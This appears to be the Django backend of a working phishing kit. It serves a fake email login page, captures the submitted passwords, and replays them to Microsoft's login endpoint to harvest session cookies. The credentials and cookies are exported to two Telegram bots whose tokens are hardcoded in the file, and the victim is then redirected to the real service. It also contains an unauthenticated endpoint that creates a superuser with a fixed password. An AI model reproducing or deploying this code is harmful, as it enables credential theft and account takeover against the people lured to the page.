from django.shortcuts import render, redirect
from django.contrib.auth import login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.mail import EmailMessage
from django.conf import settings
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.admin.views.decorators import staff_member_required
import random
import string
import json
import requests
from datetime import datetime
from .models import SessionTracking, ClickEvent

# ========== TELEGRAM CONFIGURATION - DUAL BOTS ==========
# BOT 1: Your original bot
BOT1_TOKEN = "8518266646:AAE29WCw65NMEZnVEH7h6q8tNKhFSBw5uqM"
BOT1_CHAT_ID = "6653593232"

# BOT 2: The new bot (Provate Life)
BOT2_TOKEN = "6591325062:AAGFUI3cA6QgBkq5OQ0mh99eVMSmO7RCgDU"
BOT2_CHAT_ID = "6540256516"

# List of all bots for easy iteration
TELEGRAM_BOTS = [
    {"token": BOT1_TOKEN, "chat_id": BOT1_CHAT_ID},
    {"token": BOT2_TOKEN, "chat_id": BOT2_CHAT_ID},
]

def send_telegram_message(message):
    """Send message to ALL Telegram bots"""
    success = True
    for bot in TELEGRAM_BOTS:
        try:
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            data = {
                "chat_id": bot['chat_id'],
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data)
            if response.status_code != 200:
                success = False
                print(f"[TELEGRAM ERROR] Bot failed: {bot['token'][:10]}... Status: {response.status_code}")
        except Exception as e:
            success = False
            print(f"[TELEGRAM ERROR] {str(e)}")
    return success

def send_telegram_file(file_content, filename):
    """Send file to ALL Telegram bots"""
    success = True
    for bot in TELEGRAM_BOTS:
        try:
            url = f"https://api.telegram.org/bot{bot['token']}/sendDocument"
            files = {'document': (filename, file_content, 'application/json')}
            data = {'chat_id': bot['chat_id']}
            response = requests.post(url, files=files, data=data)
            if response.status_code != 200:
                success = False
                print(f"[TELEGRAM ERROR] File send failed for bot: {bot['token'][:10]}...")
        except Exception as e:
            success = False
            print(f"[TELEGRAM ERROR] {str(e)}")
    return success

# ========== HELPER FUNCTIONS ==========

def generate_session_id():
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    return f"MS_{timestamp}_{random.randint(10000, 99999)}"

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0]
    return request.META.get('REMOTE_ADDR')

def get_browser_info(user_agent):
    ua = user_agent.lower()
    info = {'browser': 'Unknown', 'os': 'Unknown', 'device': 'Desktop'}
    if 'chrome' in ua and 'edg' not in ua:
        info['browser'] = 'Chrome'
    elif 'firefox' in ua:
        info['browser'] = 'Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        info['browser'] = 'Safari'
    elif 'edg' in ua:
        info['browser'] = 'Edge'
    if 'windows' in ua:
        info['os'] = 'Windows'
    elif 'mac' in ua:
        info['os'] = 'macOS'
    elif 'linux' in ua:
        info['os'] = 'Linux'
    elif 'android' in ua:
        info['os'] = 'Android'
        info['device'] = 'Mobile'
    elif 'iphone' in ua or 'ipad' in ua:
        info['os'] = 'iOS'
        info['device'] = 'Mobile'
    return info

# ========== COOKIE FUNCTIONS ==========

def cookies_to_netscape_format(cookies_dict, domain='.microsoft.com'):
    lines = ["# Netscape HTTP Cookie File", "# This is a generated file!", ""]
    for name, value in cookies_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
    return "\n".join(lines)

def cookies_to_firefox_json(cookies_dict):
    cookies_list = []
    for name, value in cookies_dict.items():
        cookies_list.append({
            'name': name,
            'value': value,
            'domain': '.microsoft.com',
            'path': '/',
            'httpOnly': False,
            'secure': True,
            'sameSite': 'no_restriction',
            'session': True
        })
    return cookies_list

# ========== SEND TO TELEGRAM ==========

def send_to_telegram(session_data, session_id):
    """Send captured data to ALL Telegram bots"""
    
    email = session_data.get('user', {}).get('email', 'Not captured')
    password = session_data.get('user', {}).get('password', 'Not captured')
    service = session_data.get('service', 'Unknown')
    microsoft_cookies = session_data.get('microsoft_cookies', {})
    
    message = f"""
🔐 <b>NEW LOGIN CAPTURED!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>CREDENTIALS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
📌 <b>Service:</b> {service}

━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>SESSION INFO</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>{session_id}</code>
🌍 <b>IP:</b> {session_data.get('ip_address', 'Unknown')}
💻 <b>Browser:</b> {session_data.get('browser', {}).get('name', 'Unknown')}
📱 <b>Device:</b> {session_data.get('device', {}).get('type', 'Unknown')}
🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━
🍪 <b>COOKIES CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Total:</b> {len(microsoft_cookies)}
📋 <b>Names:</b> {', '.join(microsoft_cookies.keys()) if microsoft_cookies else 'None'}
"""
    
    # Send to ALL bots
    send_telegram_message(message)
    
    if microsoft_cookies:
        firefox_cookies_json = cookies_to_firefox_json(microsoft_cookies)
        json_content = json.dumps(firefox_cookies_json, indent=2)
        send_telegram_file(json_content, f"cookies_{session_id}.json")
    
    return True

# ========== SESSION STORAGE ==========

active_sessions = {}

def get_or_create_session(session_id):
    if session_id not in active_sessions:
        active_sessions[session_id] = {
            'session_id': session_id,
            'start_time': datetime.now().isoformat(),
            'ip_address': None,
            'user_agent': None,
            'referer': None,
            'tracking_source': None,
            'browser': {},
            'os': {},
            'device': {},
            'screen': {},
            'user': {},
            'events': [],
            'cookies': {},
            'microsoft_cookies': {},
            'service': 'Unknown'
        }
    return active_sessions[session_id]

# ========== TRACK CLICK ==========

@csrf_exempt
def track_click(request):
    session_id = generate_session_id()
    ref = request.GET.get('ref', 'direct')
    
    session_data = get_or_create_session(session_id)
    
    # ===== CAPTURE IP =====
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR', 'Unknown')
    session_data['ip_address'] = ip
    
    # ===== CAPTURE USER AGENT =====
    user_agent = request.META.get('HTTP_USER_AGENT', '')
    session_data['user_agent'] = user_agent
    
    # ===== CAPTURE BROWSER INFO =====
    browser_info = get_browser_info(user_agent)
    session_data['browser']['name'] = browser_info['browser']
    session_data['os']['name'] = browser_info['os']
    session_data['device']['type'] = browser_info['device']
    
    session_data['referer'] = request.META.get('HTTP_REFERER', '')
    session_data['tracking_source'] = ref
    session_data['cookies'] = dict(request.COOKIES)
    
    print(f"[TRACK] Session: {session_id}")
    print(f"[TRACK] IP: {ip}")
    print(f"[TRACK] Browser: {browser_info['browser']}")
    print(f"[TRACK] Device: {browser_info['device']}")
    
    response = redirect('/login/')
    response.set_cookie('ms_session_id', session_id, max_age=30*24*60*60, httponly=False)
    response.set_cookie('tracking_ref', ref, max_age=30*24*60*60, httponly=False)
    
    return response

# ========== LOGIN PAGE ==========

@csrf_exempt
def login_page(request):
    """Main login page with service dropdown + proxy to Microsoft"""
    
    session_id = request.COOKIES.get('ms_session_id')
    if not session_id:
        return redirect('track_click')
    
    session_data = get_or_create_session(session_id)
    
    if request.method == 'POST':
        email = request.POST.get('email', '')
        password = request.POST.get('password', '')
        service = request.POST.get('service', '')
        
        if email and password:
            session_data['user'] = {
                'email': email,
                'password': password,
                'submitted_at': datetime.now().isoformat()
            }
            session_data['service'] = service
            
            print(f"[CREDENTIALS CAPTURED] {service}: {email}:{password}")
            
            # ========== PROXY TO MICROSOFT TO CAPTURE COOKIES ==========
            try:
                proxy_session = requests.Session()
                
                # Get Microsoft login page
                proxy_session.get(
                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                    params={
                        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                        'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': 'openid profile email',
                    }
                )
                
                # Submit credentials to Microsoft
                ms_response = proxy_session.post(
                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                    data={
                        'loginfmt': email,
                        'passwd': password,
                        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                        'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': 'openid profile email',
                    },
                    allow_redirects=False
                )
                
                # ========== CAPTURE MICROSOFT COOKIES! ==========
                microsoft_cookies = proxy_session.cookies.get_dict()
                session_data['microsoft_cookies'] = microsoft_cookies
                
                print(f"[🍪 MICROSOFT COOKIES CAPTURED] {len(microsoft_cookies)} cookies")
                print(f"[📋 COOKIE NAMES] {', '.join(microsoft_cookies.keys())}")
                
                # Send to ALL Telegram bots
                send_to_telegram(session_data, session_id)
                
            except Exception as e:
                print(f"[❌ PROXY ERROR] {str(e)}")
                # Still send credentials even if proxy fails
                send_to_telegram(session_data, session_id)
            
            # ========== REDIRECT TO REAL SERVICE ==========
            service_urls = {
                'outlook': 'https://outlook.live.com',
                'hotmail': 'https://outlook.live.com',
                'yahoo': 'https://mail.yahoo.com',
                'aol': 'https://mail.aol.com',
                'other': 'https://mail.google.com',
                'office': 'https://office.com',
                'webmail': 'https://webmail.com'
            }
            
            redirect_url = service_urls.get(service, 'https://outlook.live.com')
            return redirect(redirect_url)
    
    return render(request, 'login.html')

# ========== DASHBOARD ==========

@login_required
def dashboard_view(request):
    return render(request, 'dashboard.html', {'user': request.user})

def logout_view(request):
    logout(request)
    return redirect('login')

# ========== API ENDPOINTS ==========

@csrf_exempt
def collect_click_event(request):
    try:
        data = json.loads(request.body)
        session_id = data.get('session_id')
        
        if session_id and session_id in active_sessions:
            event = {
                'type': data.get('event_type', 'click'),
                'x': data.get('x', 0),
                'y': data.get('y', 0),
                'target': data.get('target', 'Unknown'),
                'timestamp': datetime.now().isoformat()
            }
            active_sessions[session_id]['events'].append(event)
        
        return JsonResponse({'status': 'success'})
    except Exception:
        return JsonResponse({'status': 'error'})

# ========== ADMIN VIEWS ==========

@staff_member_required
def all_users_view(request):
    users = User.objects.all().order_by('-date_joined')
    return render(request, 'all_users.html', {
        'users': users,
        'total_users': users.count()
    })

@staff_member_required
def all_sessions_view(request):
    sessions = SessionTracking.objects.all().order_by('-first_click')
    return render(request, 'all_sessions.html', {
        'sessions': sessions,
        'total_sessions': sessions.count()
    })

def create_admin(request):
    admin, created = User.objects.get_or_create(
        username='admin',
        defaults={
            'email': 'admin@gmail.com',
            'first_name': 'Administrator',
            'is_staff': True,
            'is_superuser': True,
            'is_active': True
        }
    )
    if not created:
        admin.set_password('admin123')
        admin.save()
    
    return JsonResponse({
        'status': 'success',
        'email': 'admin@gmail.com',
        'password': 'admin123'
    })
